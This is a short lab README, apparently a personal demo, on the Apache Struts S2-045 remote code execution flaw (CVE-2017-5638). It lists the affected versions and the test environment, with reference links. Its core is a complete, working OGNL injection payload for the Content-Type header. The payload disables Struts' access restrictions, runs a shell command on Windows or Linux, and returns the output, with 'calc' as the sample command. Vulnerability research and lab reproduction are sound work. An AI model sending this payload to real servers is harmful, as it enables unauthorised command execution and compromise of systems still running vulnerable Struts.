# S2-045 Demo

## Summary

Impact of vulnerability: Possible RCE when performing file upload based on Jakarta Multipart parser

Affected Software:  `Struts 2.3.5` - `Struts 2.3.31`, `Struts 2.5 - Struts 2.5.10`

Problem: 在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。

## Environment

Struts2 Version: `Struts-2.3.24`

Server: `Tomcat 8.5.53`

IDE: `idea 2020.1.1 ULTIMATE`

## POC

![{FA66A3B9-0238-4B3D-A51E-8542B25F51EB}_20200724165155]({FA66A3B9-0238-4B3D-A51E-8542B25F51EB}_20200724165155.jpg)

Payload: 

```java
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='calc').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data;
```

## Debug



## Reference

- [S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)
- [S2-045 远程代码执行漏洞（CVE-2017-5638）]( https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/README.zh-cn.md)
- [Struts-S2-045漏洞利用（含环境搭建、含POC）](https://blog.csdn.net/zzkk_/article/details/77159524)

